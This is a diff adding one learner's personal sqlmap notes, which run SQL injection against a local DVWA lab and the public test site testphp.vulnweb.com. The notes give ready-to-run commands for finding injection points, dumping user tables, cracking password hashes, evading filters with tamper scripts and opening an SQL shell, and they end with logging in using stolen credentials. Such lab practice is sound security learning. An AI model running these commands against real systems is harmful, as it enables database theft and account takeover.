@@ -1,0 +1,107 @@
+// SQLMAP notes aka manual for myself by koff (remember the name)
+
+1- How to discover if a site is vulnerable to sql or not
+sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low'
+# to get the session id do inspect after a try on a site and determine the security level aswell
+--> identifies multiple sql injection point 
+
+2-Extraction of database
+#do sqlmap --help to checkout all options for this 
+# -D for database -t for table --tables --tables for al the tables of a database
+--> Mostly to see schemas and see the databses and tables we habe on this vuneranle site
+
+	i) list all availabe database from the vulnerable site:
+		sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --dbs
+
+	ii) Check tables avialable in a  database:
+		sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --dbs --tables --tables -D dvwa
+ 
+	iii) much more explore by yourslef by exexuting 'sqlmap --help'
+
+3- Dumping Database content
+--> Returns what is in a table all the data into it and if there's hash in password for an assumption then it will kinda Bruteforce to match the pattern with hash
+	and returns the match value something like 'cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                              
+	
+	command:  sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' -D dvwa -t users --dump-all
+
+4- Automation
+--> For Automation of every basic thing 
+	i) Automate The Sqlmap discovery with default way to bypass the questions asked while performing it
+ 		command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --batch
+	
+	ii) Automate the database extraction
+		command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low'--dbs --batch
+
+	iii) Automate Table extraction from a particular database
+		COMMANDS: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low'-D dvwa --tables --batch
+
+	iv) Automate dumping db
+		command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' -D dvwa -T users --dump-all --batch
+
+5- Fingerprinting the Database
+--> Tell you about the database and it's info something like "web server operating system: Linux Debian 9 (stretch)
+	web application technology: Apache 2.4.25
+	back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+	banner: '10.1.26-MariaDB-0+deb9u1"
+
+	i) Basic Information about the databse
+		command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --banner 
+	
+	ii) Checking current Database we are using:
+		command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --banner --current-db
+
+6- Wizard Mode
+--> Good for Beginners as it provides simple interface and asks question to get it done 
+	command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --wizard
+
+7- Tamper Scripts
+--> They are python Scripts that modify the SQLMap payloads before they are sent to the target They can encode or alert parts of the payloads in ways that might help bypass filters or delection systems 
+--> basically a script that makes my payload looks harmless
+
+	i} to see availabe tamper scripts to use
+		command: sqlmap --list-tampers
+
+	#TO use it --tamper and select a payload for exaple base04encode then write --tamper=base04encode
+	steps
+		1: Select a payload 
+		2:(Don't execute it yet)  write the command with the tamperscript: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --tamper=base04encode --batch --users
+		3: Open Wireshark TO track our payload 
+		4: Choose the option that fits your situation for example i choosed loopback:IO
+		5: Execute the command 
+		6: track your packet look for get 
+		7: See the execution results done
+
+8- Mobile option 
+--> This is used for mobile options as some sites have different Behaviour in mobiles which might help us to find different vulnerabilty  uses "--mobile" 	
+	TO use:
+		command: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --mobile
+		# Will as for the type of mobile like iphone, samsung etc (iphone works best)
+		# Wireshark Prefered To scan your traffic
+
+9- Gaining SQL Shell
+--> A powerfull feature that allots you the sql shell directly to manipulate the data directly 
+	steps:
+		1: Identify If the target is vulnerabke to sql injection by sql discovery
+		2: run the command with --sql-shell: sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=30r8d9tfm1mleru56rcpqppmp5; security=low' --sql-shell --batch
+		3: You have successfully entered the sqlshell run the command as you like
+
+10- crawl
+--> usage:
+	1--crawl=3
+		Depth 0: No crawling; SQLMap will only scan the specified URL.
+		Depth 1:Crawl only the starting URL.
+		Depth 2:Crawl the starting URL and the links found on it.
+		Depth 3: Crawl the starting URL, the links on it, and the links on those linked pages.
+
+
+## Real Time usage on http://testphp.vulnweb.com/ 
+i) sqlmap -u 'http://testphp.vulnweb.com/' --crawl=2 --batch 
+ii) look for testing url init and see which sql injection vulnerablility 
+iii) then find all databse availabe in it cmd: sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs --batch
+iv) After finding the available database look for tables of one of them cmd: sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' -D acuart --tables --batch
+v) Take a table and scan for it's colums to get password or whatever eg cmd:sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users --columns --batch
+vi) Do a dump data on it cmd: sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users --dump-all --batch
+vii) Now look for the username and password credentials in the table to log in the site 
+
+______________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
